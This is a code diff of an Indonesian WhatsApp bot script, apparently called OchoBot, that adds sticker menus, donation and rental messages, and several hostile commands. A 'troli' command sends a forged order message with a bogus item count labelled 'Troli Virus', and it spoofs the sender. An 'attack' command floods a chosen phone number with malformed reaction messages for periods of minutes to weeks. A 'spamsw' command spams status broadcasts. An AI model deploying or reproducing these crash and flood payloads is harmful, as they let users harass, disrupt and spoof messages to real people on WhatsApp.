-  thumbnail: thumb,
-  mediaType: 2,
-  mediaUrl: myytv,
+  thumbnail: xc,
+  mediaType: 1,
   sourceUrl: myyt
   }}
   }
@@ -4787,13 +5091,22 @@ case 'tesrow':{
     title: "Sub Menu Ke -20",
 	rows: [
 	   {
+	    title: "【😝】› RANDOM STICKER ‹", 
+	    rowId: `${prefix}stickermenu`,
+	    },	    
+     ]
+    },
+    {
+    title: "Sub Menu Ke -21",
+	rows: [
+	   {
 	    title: "【👀】› Asupan Menu ‹", 
 	    rowId: `${prefix}asupanmenu`,
 	    },	    
      ]
     },
     {
-    title: "Sub Menu Ke -21",
+    title: "Sub Menu Ke -22",
 	rows: [
 	   {
 	    title: "【🌌】› Random Image ‹", 
@@ -4802,7 +5115,7 @@ case 'tesrow':{
      ]
     },
     {
-    title: "Sub Menu Ke -22",
+    title: "Sub Menu Ke -23",
 	rows: [
 	   {
 	    title: "【🐦】› RPG MENU ‹", 
@@ -4874,7 +5187,7 @@ case 'tesrow':{
   }
 break
 case 'bugmenu':{
-	reply(`BUG MENU :\n .attack > nomor target <`)
+	reply(`BUG MENU :\n .' > nomor target <`)
 	}
 	break
 case 'gamemenu':{
@@ -4996,41 +5309,54 @@ RECODE : https://safelink.id/fUSteSe
        }
 break
 case 'donasi': case 'donate': case 'donasi': case 'donasi': {
-                SatganzDevs.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/d460e086f9f9bf6b04e17.jpg' }, caption: `*Hi Bro ${m.pushName}*\n*_Jika ingin Donasi Silahkan Scan Gambar Diatas_*
+	let message = await prepareWAMessageMedia({ image: thumb }, { upload: SatganzDevs.waUploadToServer })
+	let donate = generateWAMessageFromContent(m.chat, {
+		"orderMessage": {
+          "orderId": "690269835950138",
+          "thumbnail": thumb,
+          "itemCount": 100000,
+          "status": "INQUIRY",
+          "surface": "CATALOG",
+          "message": `*Hi Bro ${m.pushName}*\n*_Jika ingin Donasi Silahkan Scan Gambar Diatas_*
 
 *_Atau Via_*
-- Dana : 081545463585
-- OVO : 089518363262
-- Saweria : https://saweria.co/SatganzDevssec
+- Dana : 081316701742
+- OVO : 081316701742
+- Saweria : https://saweria.co/SatganzDevs
 
-*_Terima Kasih Bagi Yang Sudah Donasi_*\n` }, { quoted: m })
-            }
+*_Terima Kasih Bagi Yang Sudah Donasi_*\n`,
+          "orderTitle": "OchoBot",
+          "sellerJid": "6281268248904@s.whatsapp.net",
+          "token": "AR5XkLwPeYBO127RjjAq9sGDRyexpZBgGtyAKbUO7LbxdQ==",
+          "totalAmount1000": "5000000",
+          "totalCurrencyCode": "IDR"
+		}
+        }, { userJid: m.chat, quoted: m })
+SatganzDevs.relayMessage(m.chat, donate.message, { messageId: donate.key.id })
+                }
             break
 case 'sewabot':{
-let sections = [
-
-                {
-
-                title: "✧──────[ SEWABOT ]──────✧",
-
-                rows: [
-
-                {title: "OWNER", rowId: `${prefix}owner`, description: ``},
-                
-                {title: "Official Bot WhatsApp", rowId: `${prefix}groupbot`, description: ``},
-
-                ]
-
-                },
-
-                ]
-
-                SatganzDevs.sendListMsg(m.chat, `*────── 「 SEWA BOT 」 ──────*
+let donate = generateWAMessageFromContent(m.chat, {
+		"orderMessage": {
+          "orderId": "690269835950138",
+          "thumbnail": thumb,
+          "itemCount": 100,
+          "status": "INQUIRY",
+          "surface": "CATALOG",
+          "message": `*────── 「 SEWA BOT 」 ──────*
                 
 𝐥𝐢𝐬𝐭 𝐬𝐞𝐰𝐚 𝐤𝐚𝐦𝐢 𝐬𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐝𝐢𝐩𝐢𝐥𝐢𝐡
 • 1 Minggu 5k
 • 2 Minggu 10k
-┗━━━•❅•°•❈`, ' ', ' ', `Lihat!`, sections, m)
+┗━━━•❅•°•❈`,
+          "orderTitle": "OchoBot",
+          "sellerJid": "6281268248904@s.whatsapp.net",
+          "token": "AR5XkLwPeYBO127RjjAq9sGDRyexpZBgGtyAKbUO7LbxdQ==",
+          "totalAmount1000": "5000000",
+          "totalCurrencyCode": "IDR"
+		}
+        }, { userJid: m.chat, quoted: m })
+SatganzDevs.relayMessage(m.chat, donate.message, { messageId: donate.key.id })
        }
 break
             case 'grupmenu': {
@@ -5075,6 +5401,10 @@ let buttonMessage = {
   }
  SatganzDevs.sendMessage(m.chat, buttonMessage, {quoted: m})
   }
+break
+case '&&':{
+    
+}
 break
             case 'soundmenu': {
 sond = `「 *Sound Menu* 」
@@ -5231,6 +5561,36 @@ let buttonMessage = {
  SatganzDevs.sendMessage(m.chat, buttonMessage, {quoted: m})
   }
 break
+case 'stickermenu':{
+stiks =`「 *RANDOM STICKER* 」
+あ ${prefix}patrick
+あ ${prefix}doge
+あ ${prefix}mukelu
+あ ${prefix}love
+あ ${prefix}gura
+あ ${prefix}paimon
+あ ${prefix}sanime
+──────────────•`
+	let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'BACK‡'}, type: 1},{buttonId: `donasi`, buttonText: {displayText: 'DONASI‡'}, type: 1}]
+let buttonMessage = {
+  document: fs.readFileSync('./SatganzDevsMedia/doc/fake.pdf'),
+  fileName : `Hi ${pushname} |${ucapanWaktu}`,
+  caption: stiks,
+  footer: '© OchoBot',
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: '© OchoBot',
+  body: 'Follow Me on Instagram', 
+  showAdAttribution: true,
+  thumbnail: xc,
+  mediaType: 1,
+  sourceUrl: myyt
+  }}
+  }
+ SatganzDevs.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }
+break
             case 'photomenu': {
 pimbon = `「 *Photo Oxy* 」
 あ ${prefix}naruto
@@ -5347,6 +5707,7 @@ rndom = `「 *Random Menu* 」
 あ ${prefix}couple
 あ ${prefix}anime
 あ ${prefix}waifu
+あ ${prefix}nsfw
 ──────────────•`
 let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'BACK‡'}, type: 1},{buttonId: `donasi`, buttonText: {displayText: 'DONASI‡'}, type: 1}]
 let buttonMessage = {
@@ -5375,7 +5736,7 @@ rndom = `「 *Hosting Menu* 」
 あ ${prefix}termintate
 ──────────────•`
 let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'BACK‡'}, type: 1},{buttonId: `donasi`, buttonText: {displayText: 'DONASI‡'}, type: 1}]
-            await SatganzDevs.sendButtonText(m.chat, buttons, rndom, nyoutube, m)
+            await SatganzDevs.sendButtonText(m.chat, buttons, rndom, global.botname, m)
             }
             break
             case 'textpro': {
@@ -5978,6 +6339,7 @@ break
 oner = `「 *Owner Menu* 」
 あ ${prefix}react [emoji]
 あ ${prefix}chat [option]
+あ ${prefix}activity [option]
 あ ${prefix}join [link]
 あ ${prefix}leave
 あ ${prefix}block @user
@@ -6279,10 +6641,113 @@ break
 ──────────────•
 _DONASI Ngab_\n_Jangan Ngarep Free Mulu_`
                 let buttons = [{ buttonId: 'DONASI', buttonText: { displayText: '🙏DONASI' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
-            await SatganzDevs.sendButtonText(m.chat, buttons, anu, nyoutube, m, {mentions: ments})
+            await SatganzDevs.sendButtonText(m.chat, buttons, anu, global.botname, m, {mentions: ments})
             }
             break
-            case 'sound1':
+case 'troli':
+SatganzDevs.sendMessage(m.chat, { text: `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+▒▒█▒▒▒▄██████████▄▒▒▒▒
+▒█▐▒▒▒████████████▒▒▒▒
+▒▌▐▒▒██▄▀██████▀▄██▒▒▒
+▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
+▐┼▐▒▒██████████████▒▒▒
+▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
+▒▒█████──────────▐███▌
+▒▒█▀▀██▄█─▄───▐─▄███▀▒
+▒▒█▒▒███████▄██████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒█████████▐▌██▌▒▒▒
+▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`},{
+ quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+    orderMessage: {
+    thumbnail: thumb,
+    itemCount: -969769349, // Bug
+    status: 1,
+    surface: 1,
+    message: '☠️SatganzDevs Was Here☠️',
+    orderTitle: 'Troli Virus👹', // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+break
+case 'spamsw':
+if (!isCreator) return reply('owner only')
+if (!q) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
+				argzi = q.split("|")
+				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
+				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
+				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
+				for (let i = 0; i < argzi[1]; i++){
+					SatganzDevs.sendMessage('status@broadcast', { text : argzi[0]})
+                    }
+                    break	
+case 'patrick': case 'patricksticker': case 'petrik': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'dogesticker': case 'dogestick': case 'doge': case 'domge': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'lovesticker': case 'lovestick' : case 'slove': case 'love': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'gura': case 'gurastick': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'paimon': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/Paimon')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'sanime': case 'animestick': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'mukelu': case 'lu': {
+var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')
+var wifegerak = ano.split('\n')
+var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
+encmedia = await SatganzDevs.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
+await fs.unlinkSync(encmedia)
+}
+break
+case 'sound1':
 case 'sound2':
 case 'sound3':
 case 'sound4':
@@ -6446,6 +6911,8 @@ case 'sound161':
 SatganzDevs_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await SatganzDevs.sendMessage(m.chat, { audio: SatganzDevs_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
+
+//batas akhir
 case prefix+'attack':
 	        if (!isCreator && !isPremium) return reply('luwh siapa?')
             if (args.length < 2) return reply(`Mau Attack Siapa?`)
@@ -6468,41 +6935,41 @@ case prefix+'attack':
                 {
             title: "MINUTE SELECTION",
                 rows: [
-           {title: "1 Minute", rowId: `${prefix}atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
-           {title: "2 Minute", rowId: `${prefix}atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
-           {title: "3 Minute", rowId: `${prefix}atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
-           {title: "4 Minute", rowId: `${prefix}atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
-           {title: "5 Minute", rowId: `${prefix}atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
+           {title: "1 Minute", rowId: `${prefix}atk ${noget}|11`, description: `Attack ${noget} During 1 Minute `},
+           {title: "2 Minute", rowId: `${prefix}atk ${noget}|22`, description: `Attack ${noget} During 2 Minute`},
+           {title: "3 Minute", rowId: `${prefix}atk ${noget}|33`, description: `Attack ${noget} During 3 Minute`},
+           {title: "4 Minute", rowId: `${prefix}atk ${noget}|44`, description: `Attack ${noget} During 4 Minute`},
+           {title: "5 Minute", rowId: `${prefix}atk ${noget}|55`, description: `Attack ${noget} During 5 Minute`},
                 ]
                 },
                 {
            title: "CLOCK SELECTION",
                 rows: [
-           {title: "1 Hours", rowId: `${prefix}atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
-           {title: "2 Hours", rowId: `${prefix}atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
-           {title: "3 Hours", rowId: `${prefix}atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
-           {title: "4 Hours", rowId: `${prefix}atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
-           {title: "5 Hours", rowId: `${prefix}atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
+           {title: "1 Hours", rowId: `${prefix}atk ${noget}|600`, description: `Attack ${noget} During 1 Hours `},
+           {title: "2 Hours", rowId: `${prefix}atk ${noget}|1120`, description: `Attack ${noget} During 2 Hours `},
+           {title: "3 Hours", rowId: `${prefix}atk ${noget}|1180`, description: `Attack ${noget} During 3 Hours `},
+           {title: "4 Hours", rowId: `${prefix}atk ${noget}|1240`, description: `Attack ${noget} During 4 Hours `},
+           {title: "5 Hours", rowId: `${prefix}atk ${noget}|1300`, description: `Attack ${noget} During 5 Hours `}
                 ]
                 },
                 {
             title: "DAILY SELECTION",
             rows: [
-           {title: "1 Day", rowId: `${prefix}atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
-           {title: "2 Day", rowId: `${prefix}atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
-           {title: "3 Day", rowId: `${prefix}atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
-           {title: "4 Day", rowId: `${prefix}atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
-           {title: "5 Day", rowId: `${prefix}atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
+           {title: "1 Day", rowId: `${prefix}atk ${noget}|11440`, description: `Attack ${noget} During 1 Day `},
+           {title: "2 Day", rowId: `${prefix}atk ${noget}|12880`, description: `Attack ${noget} During 2 Day `},
+           {title: "3 Day", rowId: `${prefix}atk ${noget}|14320`, description: `Attack ${noget} During 3 Day `},
+           {title: "4 Day", rowId: `${prefix}atk ${noget}|15760`, description: `Attack ${noget} During 4 Day `},
+           {title: "5 Day", rowId: `${prefix}atk ${noget}|17200`, description: `Attack ${noget} During 5 Day `}
            ]
            },
            {
             title: "WEEKLY SELECTION",
              rows: [
-            {title: "1 Week", rowId: `${prefix}atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
-            {title: "2 Week", rowId: `${prefix}atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
-            {title: "3 Week", rowId: `${prefix}atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
-            {title: "4 Week", rowId: `${prefix}atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
-            {title: "5 Week", rowId: `${prefix}atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
+            {title: "1 Week", rowId: `${prefix}atk ${noget}|110080`, description: `Attack ${noget} During 1 Week `},
+            {title: "2 Week", rowId: `${prefix}atk ${noget}|120160`, description: `Attack ${noget} During 2 Week `},
+            {title: "3 Week", rowId: `${prefix}atk ${noget}|130240`, description: `Attack ${noget} During 3 Week `},
+            {title: "4 Week", rowId: `${prefix}atk ${noget}|140320`, description: `Attack ${noget} During 4 Week `},
+            {title: "5 Week", rowId: `${prefix}atk ${noget}|150400`, description: `Attack ${noget} During 5 Week `}
                ]
               },
              ]
@@ -6522,8 +6989,9 @@ case prefix+'attack':
             let isgclink = isLinkThisGc.test(q)
             if (isgclink) return reply(`You Can't Attack My Owner`)
             if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
+            let reactionMessage = require("@adiwajshing/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "" })
             for (let i = 0; i < terern; i++){
-            SatganzDevs.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : global.thumb },"sourceUrl": "hehe"}}}, { quoted: virus})
+            SatganzDevs.relayMessage(spar+"@s.whatsapp.net", { reactionMessage }, { messageId: "AMPUN TUAN SATGANZDEVS 🥺🙏" })
             }
             let ter = q.split("|")[1]
             reply(`Success Attack Target During Attack ${ter} Minutes`)
@@ -6614,6 +7082,7 @@ case prefix+'attack':
                     }
                     return !0
                 }
+                
 			
 		if (isCmd && budy.toLowerCase() != undefined) {
 		    if (m.chat.endsWith('broadcast')) return
